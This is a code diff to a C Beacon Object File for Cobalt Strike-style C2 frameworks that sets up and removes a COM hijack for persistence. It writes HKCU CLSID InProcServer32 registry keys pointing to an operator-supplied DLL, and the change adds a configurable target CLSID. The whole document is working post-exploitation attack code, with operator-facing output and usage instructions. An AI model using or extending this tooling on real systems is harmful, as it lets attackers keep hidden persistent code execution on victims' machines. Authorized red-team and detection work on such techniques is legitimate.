@@ -14,28 +14,34 @@ DECLSPEC_IMPORT WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteValueA(HKEY, LPCSTR)
 DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
 DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);
 DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char*, const char*);
+DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
 
-#define CLSID_TARGET "{54E211B6-3650-4F75-8334-FA359598E1C5}"
-#define BASE_KEY "Software\\classes\\CLSID\\" CLSID_TARGET
-#define INPROC_KEY BASE_KEY "\\InProcServer32"
+#define DEFAULT_CLSID "{54E211B6-3650-4F75-8334-FA359598E1C5}"
+#define MAX_KEY_PATH 512
 
-void cleanup_hijack() {
+void cleanup_hijack(const char* clsid) {
     HKEY hKey;
     LSTATUS status;
     char existingPath[512];
     DWORD existingPathSize;
     DWORD valueType;
+    char baseKey[MAX_KEY_PATH];
+    char inprocKey[MAX_KEY_PATH];
+    
+    // Build key paths
+    MSVCRT$_snprintf(baseKey, sizeof(baseKey), "Software\\classes\\CLSID\\%s", clsid);
+    MSVCRT$_snprintf(inprocKey, sizeof(inprocKey), "%s\\InProcServer32", baseKey);
     
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
     BeaconPrintf(CALLBACK_OUTPUT, " COM Hijack - Cleanup Mode");
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s", CLSID_TARGET);
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s", clsid);
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
     BeaconPrintf(CALLBACK_OUTPUT, "");
     
     // Check if the key exists
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking for existing COM hijack...");
-    status = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, INPROC_KEY, 0, KEY_READ, &hKey);
+    status = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, inprocKey, 0, KEY_READ, &hKey);
     
     if (status != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] No COM hijack found - nothing to clean up");
@@ -67,7 +73,7 @@ void cleanup_hijack() {
     
     // Delete InProcServer32 subkey
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Deleting InProcServer32 key...");
-    status = ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, INPROC_KEY);
+    status = ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, inprocKey);
     
     if (status == ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] InProcServer32 key deleted successfully");
@@ -81,7 +87,7 @@ void cleanup_hijack() {
     
     // Delete base CLSID key
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Deleting CLSID key...");
-    status = ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, BASE_KEY);
+    status = ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, baseKey);
     
     if (status == ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] CLSID key deleted successfully");
@@ -104,25 +110,31 @@ void cleanup_hijack() {
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
 }
 
-void setup_hijack(char* hijackDllPath, int pathLen) {
+void setup_hijack(char* hijackDllPath, int pathLen, const char* clsid) {
     HKEY hKey;
     LSTATUS status;
     DWORD disposition;
     char existingPath[512];
     DWORD existingPathSize;
     DWORD valueType;
+    char baseKey[MAX_KEY_PATH];
+    char inprocKey[MAX_KEY_PATH];
+    
+    // Build key paths
+    MSVCRT$_snprintf(baseKey, sizeof(baseKey), "Software\\classes\\CLSID\\%s", clsid);
+    MSVCRT$_snprintf(inprocKey, sizeof(inprocKey), "%s\\InProcServer32", baseKey);
     
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
     BeaconPrintf(CALLBACK_OUTPUT, " COM Hijack - Setup Mode");
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s", CLSID_TARGET);
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s", clsid);
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Hijack DLL Path: %s", hijackDllPath);
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
     BeaconPrintf(CALLBACK_OUTPUT, "");
     
     // Check if InProcServer32 key already exists with a value
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking if COM hijack already configured...");
-    status = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, INPROC_KEY, 0, KEY_READ, &hKey);
+    status = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, inprocKey, 0, KEY_READ, &hKey);
     
     if (status == ERROR_SUCCESS) {
         MSVCRT$memset(existingPath, 0, sizeof(existingPath));
@@ -146,7 +158,7 @@ void setup_hijack(char* hijackDllPath, int pathLen) {
             BeaconPrintf(CALLBACK_OUTPUT, "[*] Requested Path:   %s", hijackDllPath);
             BeaconPrintf(CALLBACK_OUTPUT, "");
             BeaconPrintf(CALLBACK_OUTPUT, "[-] No changes made. To reconfigure:");
-            BeaconPrintf(CALLBACK_OUTPUT, "    1. Run cleanup: execute_coff ... -Arguments string:cleanup");
+            BeaconPrintf(CALLBACK_OUTPUT, "    1. Run cleanup first");
             BeaconPrintf(CALLBACK_OUTPUT, "    2. Run setup again with new path");
             BeaconPrintf(CALLBACK_OUTPUT, "========================================");
             return;
@@ -158,10 +170,11 @@ void setup_hijack(char* hijackDllPath, int pathLen) {
     
     // Create base CLSID key
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Creating CLSID registry key...");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Key: HKCU\\%s", baseKey);
     
     status = ADVAPI32$RegCreateKeyExA(
         HKEY_CURRENT_USER,
-        BASE_KEY,
+        baseKey,
         0,
         NULL,
         REG_OPTION_NON_VOLATILE,
@@ -186,7 +199,7 @@ void setup_hijack(char* hijackDllPath, int pathLen) {
     
     status = ADVAPI32$RegCreateKeyExA(
         HKEY_CURRENT_USER,
-        INPROC_KEY,
+        inprocKey,
         0,
         NULL,
         REG_OPTION_NON_VOLATILE,
@@ -255,35 +268,60 @@ void setup_hijack(char* hijackDllPath, int pathLen) {
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
     BeaconPrintf(CALLBACK_OUTPUT, "");
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Configuration:");
+    BeaconPrintf(CALLBACK_OUTPUT, "    CLSID: %s", clsid);
     BeaconPrintf(CALLBACK_OUTPUT, "    DLL Path: %s", hijackDllPath);
     BeaconPrintf(CALLBACK_OUTPUT, "    Threading Model: Both");
     BeaconPrintf(CALLBACK_OUTPUT, "");
     BeaconPrintf(CALLBACK_OUTPUT, "[!] Upload DLL files separately");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Trigger: start msedgewebview2.exe");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Trigger by starting the target application");
     BeaconPrintf(CALLBACK_OUTPUT, "========================================");
 }
 
 void go(char *args, int len) {
     datap parser;
     char* argument;
+    char* customClsid;
     int argLen;
+    int clsidLen;
+    const char* targetClsid = DEFAULT_CLSID;
     
     BeaconDataParse(&parser, args, len);
     
-    // Extract the first argument
+    // Extract the first argument (DLL path or "cleanup")
     argument = BeaconDataExtract(&parser, &argLen);
     
     if (argument == NULL || argLen == 0) {
         BeaconPrintf(CALLBACK_ERROR, "[!] No argument provided");
         BeaconPrintf(CALLBACK_ERROR, "[!] Usage:");
-        BeaconPrintf(CALLBACK_ERROR, "    Setup:   string:<dll_path>");
-        BeaconPrintf(CALLBACK_ERROR, "    Cleanup: string:cleanup");
+        BeaconPrintf(CALLBACK_ERROR, "    Setup:   string:<dll_path> [string:<clsid>]");
+        BeaconPrintf(CALLBACK_ERROR, "    Cleanup: string:cleanup [string:<clsid>]");
+        BeaconPrintf(CALLBACK_ERROR, "");
+        BeaconPrintf(CALLBACK_ERROR, "[*] Default CLSID: %s", DEFAULT_CLSID);
+        BeaconPrintf(CALLBACK_ERROR, "[*] Example custom CLSID: {00000000-0000-0000-0000-000000000000}");
         return;
     }
     
+    // Try to extract optional second argument (custom CLSID)
+    customClsid = BeaconDataExtract(&parser, &clsidLen);
+    
+    if (customClsid != NULL && clsidLen > 0) {
+        // Validate CLSID format (basic check - should start with { and end with })
+        if (customClsid[0] == '{' && customClsid[MSVCRT$strlen(customClsid) - 1] == '}') {
+            targetClsid = customClsid;
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Using custom CLSID: %s", targetClsid);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID format. Must be like: {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}");
+            return;
+        }
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using default CLSID: %s", DEFAULT_CLSID);
+    }
+    
+    BeaconPrintf(CALLBACK_OUTPUT, "");
+    
     // Check if this is cleanup mode
     if (MSVCRT$strcmp(argument, "cleanup") == 0) {
-        cleanup_hijack();
+        cleanup_hijack(targetClsid);
         return;
     }
     
@@ -295,5 +333,5 @@ void go(char *args, int len) {
         return;
     }
     
-    setup_hijack(argument, pathLen);
+    setup_hijack(argument, pathLen, targetClsid);
 }
